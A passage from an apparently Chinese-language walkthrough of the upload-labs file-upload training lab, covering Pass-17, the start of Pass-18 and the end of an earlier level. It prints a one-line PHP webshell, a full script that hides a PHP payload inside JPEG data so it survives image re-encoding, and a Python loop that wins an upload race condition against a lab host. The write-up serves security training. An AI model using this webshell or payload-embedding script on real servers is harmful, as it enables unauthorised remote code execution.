class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成之后得到的一句话木马为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以如下使用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673872967604-c93e3422-8a31-4184-a1b5-35eae3f284e8.png" alt="image.png"><br>如果想使用<code>jpg</code>文件使用以下代码：（但是由于jpg文件容易损坏，因此可能需要多次生成）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>这种过滤方法是条件筛选，先上传文件，如果不符合格式再将文件删除。所以可以在文件没被删除时访问即可，利用这个时间差执行，但是时间差很短，所以我们可以直接使用脚本访问。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.31.88/upload-labs/upload/webshell.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    html = requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h2><p>将上传页面和文件包含触发漏洞页面发送到Burp的intruder，然后payload设置为null，即可触发条件竞争漏洞</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$UPLOAD_ADDR</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 